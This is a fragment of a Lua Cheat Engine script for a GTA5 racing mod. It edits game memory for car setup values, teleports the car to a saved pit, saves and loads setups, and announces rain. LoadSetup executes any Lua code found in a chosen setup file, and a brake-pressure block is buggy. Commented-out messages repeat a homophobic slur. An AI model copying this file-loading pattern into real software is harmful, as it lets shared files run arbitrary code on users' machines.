         speak(MixDELTA)
         UDF1.MixValue.Caption = MixDELTA
         UDF1.MixValueDisp.Caption = MixDELTA
      end
     end
    end

    function SwitchEngine()
      if FuelSystemEnabled == true then
       if EngRunDELTA == 1 then
          LastMixCurrent = MixCurrent
          RWDRun = RWDCurrent
          MixCurrent = 0
          RWDCurrent = 0
          EngRunDELTA = 0
          writeFloat(RWDADR,RWDCurrent)
          UDF1.MixValueDisp.Caption = "ENGINE OFF"
          speak("Двигатель выключен")
          SendPack("ENGINE OFF",0,1)
          sleep(50)
       elseif EngRunDELTA == 0 then
          MixCurrent = LastMixCurrent
          RWDCurrent = RWDRun
          EngRunDELTA = 1
          writeFloat(RWDADR,RWDCurrent)
          UDF1.MixValueDisp.Caption = MixDELTA
          speak("Двигатель включен")
          SendPack("ENGINE ON",0,1)
          sleep(50)
       end
      end
    end

    function PreloadIncrease()
     if PreloadDELTA ~= 160 then
        FrontGripCurrent = FrontGripCurrent - 0.002
        RearGripCurrent = RearGripCurrent + 0.002
        SteeringLockRatioCurrent = SteeringLockRatioCurrent - 0.05
       PreloadDELTA = PreloadDELTA + 5
       UDF1.PreloadValue.Caption = PreloadDELTA.." Nm"
       writeFloat(FrontGripADR,FrontGripCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       writeFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
       ChangedSetup=true
     end
    end

    function PreloadDecrease()
     if PreloadDELTA ~= 0 then
        FrontGripCurrent = FrontGripCurrent + 0.002
        RearGripCurrent = RearGripCurrent - 0.002
        SteeringLockRatioCurrent = SteeringLockRatioCurrent + 0.05
       PreloadDELTA = PreloadDELTA - 5
       UDF1.PreloadValue.Caption = PreloadDELTA.." Nm"
       writeFloat(FrontGripADR,FrontGripCurrent)
       writeFloat(RearGripADR,RearGripCurrent)
       writeFloat(SteeringLockRatioADR,SteeringLockRatioCurrent)
       ChangedSetup=true
     end
    end
  end

  --CONTROL PAGES
  function LoadPagesControl()
    function SelectChassis()
     UDF1.SuspensionPageButton.Caption='SUSPENSION'
     UDF1.SuspensionPanel.Enabled=false
     UDF1.SuspensionPanel.Visible=false

     UDF1.EnginePageButton.Caption='DRIVETRAIN'
     UDF1.EnginePanel.Enabled=false
     UDF1.EnginePanel.Visible=false

     UDF1.AdvancedPageButton.Caption='ADVANCED'
     UDF1.AdvancedPanel.Visible=false
     UDF1.AdvancedPanel.Enabled=false

     UDF1.ChassisPageButton.Caption='-> CHASSIS <-'
     UDF1.ChassisPanel.Enabled=true
     UDF1.ChassisPanel.Visible=true
     PitMenu = 2
    end

    function SelectSuspension()
     UDF1.SuspensionPageButton.Caption='-> SUSPENSION <-'
     UDF1.SuspensionPanel.Visible=true
     UDF1.SuspensionPanel.Enabled=true
     PitMenu = 3

     UDF1.EnginePageButton.Caption='DRIVETRAIN'
     UDF1.EnginePanel.Enabled=false
     UDF1.EnginePanel.Visible=false

     UDF1.AdvancedPageButton.Caption='ADVANCED'
     UDF1.AdvancedPanel.Visible=false
     UDF1.AdvancedPanel.Enabled=false

     UDF1.ChassisPageButton.Caption='CHASSIS'
     UDF1.ChassisPanel.Visible=false
     UDF1.ChassisPanel.Enabled=false
    end

    function SelectEngine()
     UDF1.SuspensionPageButton.Caption='SUSPENSION'
     UDF1.SuspensionPanel.Visible=false
     UDF1.SuspensionPanel.Enabled=false

     UDF1.EnginePageButton.Caption='-> DRIVETRAIN <-'
     UDF1.EnginePanel.Enabled=true
     UDF1.EnginePanel.Visible=true
     PitMenu = 1

     UDF1.AdvancedPageButton.Caption='ADVANCED'
     UDF1.AdvancedPanel.Visible=false
     UDF1.AdvancedPanel.Enabled=false

     UDF1.ChassisPageButton.Caption='CHASSIS'
     UDF1.ChassisPanel.Visible=false
     UDF1.ChassisPanel.Enabled=false
    end

    function SelectAdvanced()
     UDF1.SuspensionPageButton.Caption='SUSPENSION'
     UDF1.SuspensionPanel.Visible=false
     UDF1.SuspensionPanel.Enabled=false

     UDF1.EnginePageButton.Caption='DRIVETRAIN'
     UDF1.EnginePanel.Enabled=false
     UDF1.EnginePanel.Visible=false

     UDF1.AdvancedPageButton.Caption='-> ADVANCED <-'
     UDF1.AdvancedPanel.Visible=true
     UDF1.AdvancedPanel.Enabled=true
     PitMenu = 4

     UDF1.ChassisPageButton.Caption='CHASSIS'
     UDF1.ChassisPanel.Visible=false
     UDF1.ChassisPanel.Enabled=false
    end
  end

  function InitSettings()
    LoadSuspensionSettings()
    LoadChassisSettings()
    LoadAdvancedSettings()
    LoadEngineSettings()
    LoadPagesControl()
  end

  function LoadSetup()
   load_dialog = createOpenDialog(self)
   load_dialog.InitalDir = os.getenv('%USERPROFILE%')
   if load_dialog.execute() then
   -- Opens a file in read mode
   file = io.open(load_dialog.FileName, "r")

   local content = file:read "*a"
   UDF1.SetupNameLabel.Caption = load_dialog.FileName
   file:close()
   load(content)()
    --local CarName = (file:read())

    --local SuspensionForceR = tonumber(file:read())
      if SuspensionForceR < 1 or SuspensionForceR > 18 then
       SuspensionForceR = 9
       --messageDialog("You are pidor. Do fair racing!!!SusForce",mtError, mbOk)
      end

    --local ARBForceR = tonumber(file:read())
      if ARBForceR < 1 or ARBForceR > 14 then
       ARBForceR = 7
       --messageDialog("You are pidor. Do fair racing!!!ARB",mtError, mbOk)
      end

    --local SuspensionRaiseR = tonumber(file:read())
      if SuspensionRaiseR < 1 or SuspensionRaiseR > 18 then
       SuspensionRaiseR = 9
       --messageDialog("You are pidor. Do fair racing!!!Raise",mtError, mbOk)
      end

    --local SuspensionBumpR = tonumber(file:read())
      if SuspensionBumpR < 1 or SuspensionBumpR > 38 then
       SuspensionBumpR = 19
       --messageDialog("You are pidor. Do fair racing!!!Bump",mtError, mbOk)
      end

    --local SuspensionReboundR = tonumber(file:read())
      if SuspensionReboundR < 1 or SuspensionReboundR > 38 then
       SuspensionReboundR = 19
       --messageDialog("You are pidor. Do fair racing!!!Rebound",mtError, mbOk)
      end

    --local SuspensionTravelR = tonumber(file:read())
      if SuspensionTravelR < 1 or SuspensionTravelR > 18 then
       SuspensionTravelR = 9
       --messageDialog("You are pidor. Do fair racing!!!Travel",mtError, mbOk)
      end

    --local FrontSpringR = tonumber(file:read())
      if FrontSpringR < 1 or FrontSpringR > 18 then
       FrontSpringR = 9
       --messageDialog("You are pidor. Do fair racing!!!FS",mtError, mbOk)
      end

    --local FrontARBR = tonumber(file:read())
      if FrontARBR < 1 or FrontARBR > 18 then
       FrontARBR = 9
       --messageDialog("You are pidor. Do fair racing!!!FARB",mtError, mbOk)
      end

    --local ToeFrontR = tonumber(file:read())
      if ToeFrontR < 1 or ToeFrontR > 36 then
       ToeFrontR = 18
       --messageDialog("You are pidor. Do fair racing!!!FTI",mtError, mbOk)
      end

    --local CamberFrontR = tonumber(file:read())
      if CamberFrontR < 1 or CamberFrontR > 50 then
       CamberFrontR = 50
       --messageDialog("You are pidor. Do fair racing!!!FC",mtError, mbOk)
      end

    --local RearSpringR = tonumber(file:read())
      if RearSpringR < 1 or RearSpringR > 18 then
       RearSpringR = 9
       --messageDialog("You are pidor. Do fair racing!!!RS",mtError, mbOk)
      end

    --local RearARBR = tonumber(file:read())
      if RearARBR < 1 or RearARBR > 18 then
       RearARBR = 9
       --messageDialog("You are pidor. Do fair racing!!!RARB",mtError, mbOk)
      end

    --local ToeRearR = tonumber(file:read())
      if ToeRearR < 1 or ToeRearR > 36 then
       ToeRearR = 18
       --messageDialog("You are pidor. Do fair racing!!!RTI",mtError, mbOk)
      end

    --local CamberRearR = tonumber(file:read())
      if CamberRearR < 1 or CamberRearR > 50 then
       CamberRearR = 50
       --messageDialog("You are pidor. Do fair racing!!!RC",mtError, mbOk)
      end

    --local WeightDistR = tonumber(file:read())
      if WeightDistR < 1 or WeightDistR > 24 then
       WeightDistR = 12
       --messageDialog("You are pidor. Do fair racing!!!WD",mtError, mbOk)
      end

    --local SteeringLockR = tonumber(file:read())
      if SteeringLockR < 1 or SteeringLockR > 3 then
       SteeringLockR = 2
       --messageDialog("You are pidor. Do fair racing!!!SL",mtError, mbOk)
      end

    --local RearWingR = tonumber(file:read())
      if RearWingR < 1 or RearWingR > 9 then
       RearWingR = 5
       --messageDialog("You are pidor. Do fair racing!!!RW",mtError, mbOk)
      end

    --local FrontWingR = tonumber(file:read())
      if FrontWingR < 1 or FrontWingR > 9 then
       FrontWingR = 5
       --messageDialog("You are pidor. Do fair racing!!!FW",mtError, mbOk)
      end

    --local BrakesSizeR = tonumber(file:read())
      if BrakesSizeR < 1 or BrakesSizeR > 3 then
       BrakesSizeR = 3
       --messageDialog("You are pidor. Do fair racing!!!BS",mtError, mbOk)
      end

    --local BrakeBiasR = tonumber(file:read())
      if BrakeBiasR < 1 or BrakeBiasR > 17 then
       BrakeBiasR = 8
       --messageDialog("You are pidor. Do fair racing!!!BB",mtError, mbOk)
      end

    --local HeadlightR = tonumber(file:read())
      if HeadlightR < 1 or HeadlightR > 2 then
       HeadlightR = 1
       --messageDialog("You are pidor. Do fair racing!!!HR",mtError, mbOk)
      end

    --local XenonColorR = tonumber(file:read())
      if XenonColorR < 1 or XenonColorR > 4 then
       XenonColorR = 1
       --messageDialog("You are pidor. Do fair racing!!!XR",mtError, mbOk)
      end

    --local TCR = tonumber(file:read())
      if TCR < 1 or TCR > 9 then
        TCR = 5
        --messageDialog("You are pidor. Do fair racing!!!TC",mtError, mbOk)
      end

    --local GearsR = tonumber(file:read())
      if GearsR < 1 or GearsR > 2 then
       GearsR = 1
       --messageDialog("You are pidor. Do fair racing!!!GR",mtError, mbOk)
      end

    --local CastorR = tonumber(file:read())
      if CastorR<1 or CastorR>18 then
       CastorR = 9
       --messageDialog("You are pidor. Do fair racing!!!CAS",mtError, mbOk)
    end

    --local BrakePressureR = tonumber(file:read())
      if BrakePressureR < 1 or BrakePressureR > 100 then
       BrakePressureR = 100
       --messageDialog("You are pidor. Do fair racing!!!BPr",mtError, mbOk)
      end

    --local TPR = tonumber(file:read())
      if TPR < 140 or TPR > 180 then
       TPR = 160
       --messageDialog("You are pidor. Do fair racing!!!TPr",mtError, mbOk)
      end

    --local PreloadR = tonumber(file:read())
      if PreloadR < 0 or PreloadR > 160 then
       PreloadR = 80
       --messageDialog("You are pidor. Do fair racing!!!PR",mtError, mbOk)
      end

       --if CarNameR == CarNameCurrent then
      if F1modeDELTA == 2 then local F1 = true end
      if GT3modeDELTA == 2 then local GT3 = true end
      if GTEmodeDELTA == 2 then local GTE = true end
      if HSmodeDELTA == 2 then local HS = true end

      BackToDefault()

      if F1array[CarNameCurrent] and F1 == true then TurnF1ModeOn() end
      if GT3array[CarNameCurrent] and GT3 == true then TurnGT3ModeOn() end
      if GTEarray[CarNameCurrent] and GTE == true then TurnGTEModeOn() end
      if HSarray[CarNameCurrent] and HS == true then TurnHSModeOn() end

      if F1array[CarNameCurrent] and F1 == false then TurnF1ModeOff() end
      if GT3array[CarNameCurrent] and GT3 == false then TurnGT3ModeOff() end
      if GTEarray[CarNameCurrent] and GTE == false then TurnGTEModeOff() end
      if HSarray[CarNameCurrent] and HS == false then TurnHSModeOff() end

          --Suspension
      if SuspensionForceR-SuspensionForceDELTA > 0 then
        for i=1,(SuspensionForceR-SuspensionForceDELTA) do
          SuspensionForceIncrease()
        end
        elseif SuspensionForceR-SuspensionForceDELTA < 0 then
        for i=1,((SuspensionForceR-SuspensionForceDELTA)*(-1)) do
          SuspensionForceDecrease()
        end
      end

  		if ARBForceR-ARBForceDELTA > 0 then
           for i=1,(ARBForceR-ARBForceDELTA) do
               ARBForceIncrease()
           end
          elseif ARBForceR-ARBForceDELTA < 0 then
           for i=1,((ARBForceR-ARBForceDELTA)*(-1)) do
               ARBForceDecrease()
           end
      end

  		if SuspensionRaiseR-SuspensionRaiseDELTA > 0 then
           for i=1,(SuspensionRaiseR-SuspensionRaiseDELTA) do
               SuspensionRaiseIncrease()
           end
          elseif SuspensionRaiseR-SuspensionRaiseDELTA < 0 then
           for i=1,((SuspensionRaiseR-SuspensionRaiseDELTA)*(-1)) do
               SuspensionRaiseDecrease()
           end
      end

  		if SuspensionBumpR-SuspensionBumpDELTA > 0 then
           for i=1,(SuspensionBumpR-SuspensionBumpDELTA) do
               SuspensionBumpIncrease()
           end
          elseif SuspensionBumpR-SuspensionBumpDELTA < 0 then
           for i=1,((SuspensionBumpR-SuspensionBumpDELTA)*(-1)) do
               SuspensionBumpDecrease()
           end
      end

  		if SuspensionReboundR-SuspensionReboundDELTA > 0 then
           for i=1,(SuspensionReboundR-SuspensionReboundDELTA) do
               SuspensionReboundIncrease()
           end
          elseif SuspensionReboundR-SuspensionReboundDELTA < 0 then
           for i=1,((SuspensionReboundR-SuspensionReboundDELTA)*(-1)) do
               SuspensionReboundDecrease()
           end
      end

      if SuspensionTravelR-SuspensionTravelDELTA > 0 then
           for i=1,(SuspensionTravelR-SuspensionTravelDELTA) do
               SuspensionTravelIncrease()
           end
          elseif SuspensionTravelR-SuspensionTravelDELTA < 0 then
           for i=1,((SuspensionTravelR-SuspensionTravelDELTA)*(-1)) do
               SuspensionTravelDecrease()
           end
      end

  		if FrontSpringR-FrontSpringDELTA > 0 then
           for i=1,(FrontSpringR-FrontSpringDELTA) do
               FrontSpringIncrease()
           end
          elseif FrontSpringR-FrontSpringDELTA < 0 then
           for i=1,((FrontSpringR-FrontSpringDELTA)*(-1)) do
               FrontSpringDecrease()
           end
      end

  		if FrontARBR-FrontARBDELTA > 0 then
           for i=1,(FrontARBR-FrontARBDELTA) do
               FrontARBIncrease()
           end
          elseif FrontARBR-FrontARBDELTA < 0 then
           for i=1,((FrontARBR-FrontARBDELTA)*(-1)) do
               FrontARBDecrease()
           end
      end

  		if ToeFrontR-ToeFrontDELTA > 0 then
           for i=1,(ToeFrontR-ToeFrontDELTA) do
               ToeFrontIncrease()
           end
          elseif ToeFrontR-ToeFrontDELTA < 0 then
           for i=1,((ToeFrontR-ToeFrontDELTA)*(-1)) do
               ToeFrontDecrease()
           end
      end

  		if CamberFrontR-CamberFrontDELTA > 0 then
           for i=1,(CamberFrontR-CamberFrontDELTA) do
               CamberFrontIncrease()
           end
          elseif CamberFrontR-CamberFrontDELTA < 0 then
           for i=1,((CamberFrontR-CamberFrontDELTA)*(-1)) do
               CamberFrontDecrease()
           end
      end

  		if RearSpringR-RearSpringDELTA > 0 then
           for i=1,(RearSpringR-RearSpringDELTA) do
               RearSpringIncrease()
           end
          elseif RearSpringR-RearSpringDELTA < 0 then
           for i=1,((RearSpringR-RearSpringDELTA)*(-1)) do
               RearSpringDecrease()
           end
      end

  		if RearARBR-RearARBDELTA > 0 then
           for i=1,(RearARBR-RearARBDELTA) do
               RearARBIncrease()
           end
          elseif RearARBR-RearARBDELTA < 0 then
           for i=1,((RearARBR-RearARBDELTA)*(-1)) do
               RearARBDecrease()
           end
      end

  		if ToeRearR-ToeRearDELTA > 0 then
           for i=1,(ToeRearR-ToeRearDELTA) do
               ToeRearIncrease()
           end
          elseif ToeRearR-ToeRearDELTA < 0 then
           for i=1,((ToeRearR-ToeRearDELTA)*(-1)) do
               ToeRearDecrease()
           end
      end

  		if CamberRearR-CamberRearDELTA > 0 then
           for i=1,(CamberRearR-CamberRearDELTA) do
               CamberRearIncrease()
           end
          elseif CamberRearR-CamberRearDELTA < 0 then
           for i=1,((CamberRearR-CamberRearDELTA)*(-1)) do
               CamberRearDecrease()
           end
      end
  		--Suspension

      --Chassis
      if WeightDistR-WeightDistDELTA > 0 then
         for i=1,(WeightDistR-WeightDistDELTA) do
             WeightDistIncrease()
         end
        elseif WeightDistR-WeightDistDELTA < 0 then
         for i=1,((WeightDistR-WeightDistDELTA)*(-1)) do
             WeightDistDecrease()
         end
      end

      if SteeringLockR-SteeringLockDELTA > 0 then
         for i=1,(SteeringLockR-SteeringLockDELTA) do
             SteeringLockIncrease()
         end
        elseif SteeringLockR-SteeringLockDELTA < 0 then
         for i=1,((SteeringLockR-SteeringLockDELTA)*(-1)) do
             SteeringLockDecrease()
         end
      end

      if RearWingR-RearWingDELTA > 0 then
         for i=1,(RearWingR-RearWingDELTA) do
             RearWingIncrease()
         end
        elseif RearWingR-RearWingDELTA < 0 then
         for i=1,((RearWingR-RearWingDELTA)*(-1)) do
             RearWingDecrease()
         end
      end

      if FrontWingR-FrontWingDELTA > 0 then
         for i=1,(FrontWingR-FrontWingDELTA) do
             FrontWingIncrease()
         end
        elseif FrontWingR-FrontWingDELTA < 0 then
         for i=1,((FrontWingR-FrontWingDELTA)*(-1)) do
             FrontWingDecrease()
         end
      end

      if CastorR-CastorDELTA > 0 then
          for i=1,(CastorR-CastorDELTA) do
              CastorIncrease()
          end
        elseif CastorR-CastorDELTA < 0 then
          for i=1,((CastorR-CastorDELTA)*(-1)) do
              CastorDecrease()
          end
      end
      --Chassis

  		--Advanced
  		if BrakesSizeR-BrakesSizeDELTA > 0 then
           for i=1,(BrakesSizeR-BrakesSizeDELTA) do
               BrakesSizeIncrease()
           end
          elseif BrakesSizeR-BrakesSizeDELTA < 0 then
           for i=1,((BrakesSizeR-BrakesSizeDELTA)*(-1)) do
               BrakesSizeDecrease()
           end
      end

  		if BrakeBiasR-BrakeBiasDELTA > 0 then
           for i=1,(BrakeBiasR-BrakeBiasDELTA) do
               BrakeBiasIncrease()
           end
          elseif BrakeBiasR-BrakeBiasDELTA < 0 then
           for i=1,((BrakeBiasR-BrakeBiasDELTA)*(-1)) do
               BrakeBiasDecrease()
           end
      end

  		if HeadlightR-HeadlightDELTA > 0 then
           for i=1,(HeadlightR-HeadlightDELTA) do
               HeadlightIncrease()
           end
          elseif HeadlightR-HeadlightDELTA < 0 then
           for i=1,((HeadlightR-HeadlightDELTA)*(-1)) do
               HeadlightDecrease()
           end
      end

  		if XenonColorR-XenonColorDELTA > 0 then
           for i=1,(XenonColorR-XenonColorDELTA) do
               XenonColorIncrease()
           end
          elseif XenonColorR-XenonColorDELTA < 0 then
           for i=1,((XenonColorR-XenonColorDELTA)*(-1)) do
               XenonColorDecrease()
           end
      end

      if TCR-TCDELTA > 0 then
           for i=1,(TCR-TCDELTA) do
               TCIncrease()
           end
          elseif TCR-TCDELTA < 0 then
           for i=1,((TCR-TCDELTA)*(-1)) do
               TCDecrease()
           end
      end

      if TPR-TPDELTA > 0 then
           for i=1,(TPR-TPDELTA) do
               TPIncrease()
           end
          elseif TPR-TPDELTA < 0 then
           for i=1,((TPR-TPDELTA)*(-1)) do
               TPDecrease()
           end
      end

      if BrakePressureR-BrakePressureDELTA > 0 then
           for i=1, (BP-BrakePressureDELTA) do
               BrakePressureIncrease()
           end
          elseif BrakePressureR-BrakePressureDELTA > 0 then
           for i=1, ((BP-BrakePressureDELTA)*(-1)) do
               BrakePressureDecrease()
           end
      end
      --Advanced

          --Engine
      if GearsR-GearsDELTA > 0 then
           for i=1,(GearsR-GearsDELTA) do
               GearsIncrease()
           end
          elseif GearsR-GearsDELTA < 0 then
           for i=1,((GearsR-GearsDELTA)*(-1)) do
               GearsDecrease()
           end
      end

      if PreloadR-PreloadDELTA > 0 then
           for i=1,(PreloadR-PreloadDELTA) do
               PreloadIncrease()
           end
          elseif PreloadR-PreloadDELTA < 0 then
           for i=1,((PreloadR-PreloadDELTA)*(-1)) do
               PreloadDecrease()
           end
      end
    end
    SendPack("SETUP-L",0,1)
  end

  function SaveSetup()
   local save_dialog = createSaveDialog(self)
   save_dialog.InitalDir = os.getenv('%USERPROFILE%')
   if save_dialog.execute() then
       local s=(save_dialog.FileName..".lua")
      file = io.open(s, "w+")

      --Suspension
      file:write("CarNameR = "..CarNameCurrent,"\n")
      file:write("SuspensionForceR = "..SuspensionForceDELTA,"\n")
      file:write("ARBForceR = "..ARBForceDELTA,"\n")
      file:write("SuspensionRaiseR = "..SuspensionRaiseDELTA,"\n")
      file:write("SuspensionBumpR = "..SuspensionBumpDELTA,"\n")
      file:write("SuspensionReboundR = "..SuspensionReboundDELTA,"\n")
      file:write("SuspensionTravelR = "..SuspensionTravelDELTA,"\n")
      file:write("FrontSpringR = "..FrontSpringDELTA,"\n")
      file:write("FrontARBR = "..FrontARBDELTA,"\n")
      file:write("ToeFrontR = "..ToeFrontDELTA,"\n")
      file:write("CamberFrontR = "..CamberFrontDELTA,"\n")
      file:write("RearSpringR = "..RearSpringDELTA,"\n")
      file:write("RearARBR = "..RearARBDELTA,"\n")
      file:write("ToeRearR = "..ToeRearDELTA,"\n")
      file:write("CamberRearR = "..CamberRearDELTA,"\n")

      --Chassis
      file:write("FrontWingR = "..FrontWingDELTA,"\n")
      file:write("RearWingR = "..RearWingDELTA,"\n")
      file:write("SteeringLockR = "..SteeringLockDELTA,"\n")
      file:write("CastorR = "..CastorDELTA,"\n")
      file:write("WeightDistR = "..WeightDistDELTA,"\n")

      --Advanced
      file:write("BrakesSizeR = "..BrakesSizeDELTA,"\n")
      file:write("BrakePressureR = "..BrakePressureDELTA,"\n")
      file:write("BrakeBiasR = "..BrakeBiasDELTA,"\n")
      file:write("TPR = "..TPDELTA,"\n")
      file:write("TCR = "..TCDELTA,"\n")
      file:write("HeadlightR = "..HeadlightDELTA,"\n")
      file:write("XenonColorR = "..XenonColorDELTA,"\n")

      --Drivetrain
      file:write("GearsR = "..GearsDELTA,"\n")
      file:write("PreloadR = "..PreloadDELTA,"\n")

      UDF1.SetupNameLabel.Caption = (save_dialog.FileName)
      SendPack("SETUP-S",0,0)
      --LOG_History=LOG_History.."SETUP-S"..(os.date("%X")).."\n"
      file:close()
   end
  end

  --WORK WITH PITBOXES
    function RememberMyPit()
       x=readFloat("[[PTR+8]+30]+50")//1
       y=readFloat("[[PTR+8]+30]+54")//1
       z=readFloat("[[PTR+8]+30]+58")//1
       UDF1.BackToPitsButton.Enabled = false
       UDF1.EnterBoxButton.Enabled = false
       UDF1.FuelB.Enabled = true
       HaveBox = true
       InThePit = false
       PositionChecker = createTimer(nil, true)  -- create a Timer object and assign it to variable t
       timer_onTimer(PositionChecker, CheckPos)   -- When the timer ticks, call the function main
       timer_setInterval(PositionChecker, 1000) -- Sets the tickrate of the timer in milliseconds
       --LOG_History=LOG_History.."PIT"..(os.date("%X")).."\n"
    end

    function BackToThePits()
     if readFloat('GTA5.exe+2630FC4') == 0 then
       writeFloat("[[[PTR+8]+D30]+30]+50", x)
       writeFloat("[[[PTR+8]+D30]+30]+54", y)
       writeFloat("[[[PTR+8]+D30]+30]+58", z+0.5)
       writeFloat("[[PTR+8]+D30]+90", x)
       writeFloat("[[PTR+8]+D30]+94", y)
       writeFloat("[[PTR+8]+D30]+98", z + 0.5)
       SendPack("TP TO PIT",0,1)
       --LOG_History=LOG_History.."TPB"..(os.date("%X")).."\n"
       --InBox()
     end
    end

    function InBox()
      timer_setEnabled(PositionChecker,false)
      if FuelSystemEnabled==true then
        if FuelEatLoop then
          timer_setEnabled(FuelEatLoop, false)
        end
        if RefuelLoop then
         timer_setEnabled(RefuelLoop, false)
        end
      end
      writeFloat(BrakeForceADR,BrakeForceCurrent)
      writeFloat(CurveMaxADR, CurveMaxCurrent)
      --writeFloat(RWDADR,0.001)

      timer_setEnabled(Status, false)
      InThePit=true
      UDF1.EnginePageButton.Enabled = true
      UDF1.ChassisPageButton.Enabled = true
      UDF1.SuspensionPageButton.Enabled = true
      UDF1.AdvancedPageButton.Enabled = true

      UDF1.HintBox.Visible=false

      UDF1.SaveSetupButton.Enabled = true
      UDF1.LoadSetupButton.Enabled = true
      UDF1.SetDefault.Enabled = true
      UDF1.RaceButton.Enabled = true

      UDF1.RepairEngButton.Enabled = false
      UDF1.FireEngButton.Enabled = false
      UDF1.CEButton2.Enabled = false

      UDF1.InitCar.Enabled = false
      UDF1.SetGarageButton.Enabled = false
      UDF1.EnterBoxButton.Enabled = false
      UDF1.BackToPitsButton.Enabled = false

      ChangedSetup=false
      if PitMenu == 1 then
         SelectEngine()
      end
      if PitMenu == 2 then
         SelectChassis()
      end
      if PitMenu == 3 then
         SelectSuspension()
      end
      if PitMenu == 4 then
         SelectAdvanced()
      end
      if OppoChek then
         timer_setEnabled(OppoCheck, false)
         OppoCheck.destroy()
      end
      if WeatherUpdate then
         timer_setEnabled(WeatherUpdate, false)
      end
      --SendPack("ENTERED BOX",0,1)
      EnableFireSuppressionSystem(false)
      if EnableSlipStream==true then
        if CheckSlipStreamTimer then CheckSlipStreamTimer.destroy() end
        if RWDSetted then writeFloat(RWDADR, RWDSetted) end
        if FrontGripSetted then writeFloat(FrontGripADR,FrontGripSetted) end
      end
    end

    function GoOnTrack()
      FormStatus()
      InThePit=false
      UDF1.MixValueDisp.Caption = MixDELTA
      UDF1.EnginePageButton.Enabled = false
      UDF1.ChassisPageButton.Enabled = false
      UDF1.SuspensionPageButton.Enabled = false
      UDF1.AdvancedPageButton.Enabled = false
      UDF1.BackToPitsButton.Enabled = true

      UDF1.RaceButton.Enabled = false
      UDF1.SetDefault.Enabled = false
      UDF1.SaveSetupButton.Enabled = false
      UDF1.LoadSetupButton.Enabled = false

      UDF1.SuspensionPanel.Visible=false
      UDF1.SuspensionPanel.Enabled=false

      UDF1.EnginePanel.Enabled=false
      UDF1.EnginePanel.Visible=false

      UDF1.AdvancedPanel.Visible=false
      UDF1.AdvancedPanel.Enabled=false

      UDF1.ChassisPanel.Visible=false
      UDF1.ChassisPanel.Enabled=false
      UDF1.HintBox.Visible=true
      UDF1.SaveSetupButton.Enabled = false
      UDF1.LoadSetupButton.Enabled = false
      UDF1.CEButton2.Enabled = true

      UDF1.InitCar.Enabled = true
      UDF1.SetGarageButton.Enabled = true

      FoundMyCurrentID()
      timer_setEnabled(PositionChecker,true)
      --SendPack("GOING ON TRACK",0,1)
      CheckLobbyParticipants()
      if ChangedSetup==true then SendPack("SETUP HAS BEEN CHANGED",0,0) end
      if FuelSystemEnabled==true then
         if FuelEatLoop then
           timer_setEnabled(FuelEatLoop, true)
         end
         writeFloat(FWDADR,FWDCurrent)
         writeFloat(RWDADR,RWDCurrent)
         OnRefuel=false
         CurrentFuelLoad=FuelDELTA
         --SendPack("FUEL LOAD = "..FuelDELTA,0,0)
      end
      if Spotter==true then
        if OppoChek then
           timer_setEnabled(OppoCheck, true)
        else
            OppoCheck = createTimer(nil,false)
            timer_onTimer(OppoCheck,CheckOppoPosition)
            timer_setInterval(OppoCheck, 500)
            timer_setEnabled(OppoCheck, true)
        end
        PlaySound(findTableFile("BeepStart.wav"), true)
        PlaySound(findTableFile('RadioCheck2.wav'), true)
        PlaySound(findTableFile("BeepEnd.wav"))
        --SendPack("SPOTTER - ON",0,0)
      end
      if CarStatus==true then
        NotAnnoySevere = false
        NotAnnoyKilledEngine = false
        if WeatherUpdate then
           timer_setEnabled(WeatherUpdate, true)
        else
            WeatherUpdate = createTimer(nil, false)
            timer_onTimer(WeatherUpdate,GetTimeBeforeTheRain)
            timer_setInterval(WeatherUpdate, 60000)
            timer_setEnabled(WeatherUpdate, true)
        end
      else
          NotAnnoySevere = true
          NotAnnoyKilledEngine = true
      end
      if EnableSlipStream == true then
        CheckSlipStreamTimer = createTimer(nil, false)
        timer_onTimer(CheckSlipStreamTimer, CheckOppoPositionSlip)
        timer_setInterval(CheckSlipStreamTimer, 10)
        timer_setEnabled(CheckSlipStreamTimer, true)
        RWDSetted = RWDCurrent
        FrontGripSetted = FrontGripCurrent
      end
      EnableFireSuppressionSystem(true)
    end
  --WORK WITH PITBOXES

  --WEATHER BOT
    function RunWeatherbot()
      rain_times = {105, 110, 131, 135, 247, 253, 369, 378}
      function GetTimeInHour()
        UTC_MILIS = os.time()
        local day = math.floor((UTC_MILIS*1000) / (2 * 1000 * 60 * 24)) % 16
        local hour = math.floor((UTC_MILIS*1000) / (2 * 1000 * 60)) % 24
        local minutes = math.floor((UTC_MILIS*1000) / (2 * 1000)) % 60

        if minutes >=50 then hour=hour+1 end

        local gta_time_hour = day * 24 + hour

        return gta_time_hour
      end

      function CorrectTime(rain_time)
        local minutes = math.floor((UTC_MILIS*1000) / (2 * 1000)) % 60

        if minutes > 30 and minutes < 50 then rain_time = rain_time - 1 end
        return rain_time
      end

      function GetTimeBeforeTheRain()
        local timestamp = GetTimeInHour()
        --IF now is day 15
          if timestamp <= 384 and timestamp > 378 then
            begin_rain_time = 384 + rain_times[1] - timestamp
            correct_time = CorrectTime(begin_rain_time * 2)
            return ReplyAboutRain(correct_time,0,false,false)
          end

          for i=1,7,2 do
          --It's raining
          if rain_times[i] <= timestamp and timestamp < rain_times[i+1] then
            end_rain_time = (rain_times[i + 1] - timestamp) * 2
            if (rain_times[i + 1] - timestamp)==1 then
              return ReplyAboutRain(0,0,false,true)
            else
              return ReplyAboutRain(0,end_rain_time,false,false)
            end
          --it's not raining
          elseif timestamp < rain_times[i] then
            begin_rain_time = rain_times[i] - timestamp
            correct_time = CorrectTime(begin_rain_time * 2)
            if begin_rain_time == 1 then
              return ReplyAboutRain(0,0,true,false)
            else
              return ReplyAboutRain(correct_time,0,false,false)
            end
          end
        end
      end

      function ReplyAboutRain(BeginRain, StopRain, RainBegun, RainStopped)
        if BeginRain ~= 0 and (BeginRain == 4 or BeginRain == 10 or BeginRain == 14 or BeginRain == 20) then
          local filename = "_"..BeginRain..".wav"
          PlaySound(findTableFile("BeepStart.wav"), true)
          PlaySound(findTableFile("RainInNext.wav"), true)
          PlaySound(findTableFile(filename),true)
          PlaySound(findTableFile("Minutes.wav"), true)
          PlaySound(findTableFile("BeepEnd.wav"), true)
        elseif StopRain ~= 0 and (StopRain == 4 or StopRain == 10 or StopRain == 14 or StopRain == 20) then
          local filename = "_"..StopRain..".wav"
          PlaySound(findTableFile("BeepStart.wav"), true)
          PlaySound(findTableFile("RainStopInNext.wav"),true)
          PlaySound(findTableFile(filename),true)
          PlaySound(findTableFile("Minutes.wav"),true)
